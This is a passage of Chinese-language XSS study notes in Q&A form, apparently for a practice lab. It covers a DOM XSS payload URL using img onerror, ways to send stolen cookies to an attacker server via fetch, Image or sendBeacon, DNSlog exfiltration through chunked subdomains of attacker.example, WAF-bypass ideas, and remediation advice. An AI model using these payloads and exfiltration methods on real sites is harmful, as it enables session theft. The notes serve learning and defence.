...
答案要点（结合你的靶场）：
13. 攻击者构造恶意 URL：`http://target.com#&lt;img src=x onerror=alert(1)&gt;`
2. 诱导用户点击该链接
3. 前端 JS 读取 location.hash，未过滤直接拼接到 innerHTML
4. 浏览器解析 HTML，执行 onerror 中的 alert
5. 攻击成功，可进一步窃取 Cookie 或执行其他操作
...
33. 存储型XSS中，盗取Cookie后如何发送到外部服务器？

常见外传方式：

- `fetch`/`XMLHttpRequest`：向攻击者控制的 HTTP 服务发请求（可能触发 CORS 预检；不需要读响应时可用 `no-cors`）  
- `Image`：拼接到 URL 参数里外带（跨域天然可发，不依赖读取响应）  
- `script`：JSONP/动态脚本加载形式（现代更常用 Image/Beacon）  
- `navigator.sendBeacon`：页面卸载时也更可靠地发送（适合埋点/外带）

示例（学习用，注意仅用于授权测试）：

```javascript
// 方式一：fetch POST（不需要读取响应）
...
34. 用 DNSlog 外传数据时，子域名长度限制是什么？如何分段外传？

- 单个标签（label）最大长度：**63** 字符（RFC 1035）
- 完整域名最大长度：**253** 字符

实践中长数据（如 Cookie/Token）通常需要：

- 先做编码（常见 base32/hex），再分片
- 每片作为一个子域名标签发送，例如：`1.<chunk>.attacker.example`、`2.<chunk>.attacker.example`

一般更常用 HTTP 外带（不受 DNS 标签长度限制、可靠性更高）。

35. 富文本 XSS 怎么修复？（白名单标签/属性 + 协议限制 + 编码 + CSP）

核心思路：**白名单标签 + 白名单属性 + URL 协议限制 + 按上下文输出编码**，再用 CSP 做缓解。

- 标签白名单：只允许安全标签（`b/i/u/strong/em/p/br/img/a` 等）
- 属性白名单：例如 `img` 仅允许 `src/alt`；`a` 仅允许 `href/rel/target`；禁止所有 `on*` 事件属性
- 协议限制：`src/href` 只允许 `http:` / `https:`（必要时允许 `mailto:`），禁止 `javascript:`、危险 `data:` 等
- 输出编码：按上下文编码（HTML 文本/属性/URL/JS 字符串分别处理）
- CSP：禁用内联脚本、限制脚本源（作为缓解，不是根治）

36. 三种 XSS 有什么区别？分别常出现在哪里？

- 反射型：payload 在请求里，服务端原样返回，常见于搜索、报错、跳转、登录提示页
- 存储型：payload 被写入数据库或持久化存储，常见于评论、昵称、留言板、工单、富文本内容
- DOM 型：不经过服务端拼接输出，而是前端 JS 直接把不可信数据写入 DOM，常见于 `location.search`、`location.hash`、`postMessage`、前端模板渲染

37. 从代码层面看，XSS 的根因是什么？

根因是把不可信输入放进了会被浏览器解释执行的位置，比如 HTML、属性、脚本上下文、URL 上下文、DOM sink（如 `innerHTML`、`document.write`、事件属性、`href=javascript:`）中，又没有做正确的上下文编码或白名单过滤。

38. 如果站点前面有 WAF，XSS 还能怎么绕？

常见思路包括大小写混淆、编码绕过、标签替换、事件处理器替换、字符串拼接、利用浏览器解析差异等。但本质上还是看 WAF 和浏览器的解析差异，以及服务端/前端最终落到哪个上下文执行。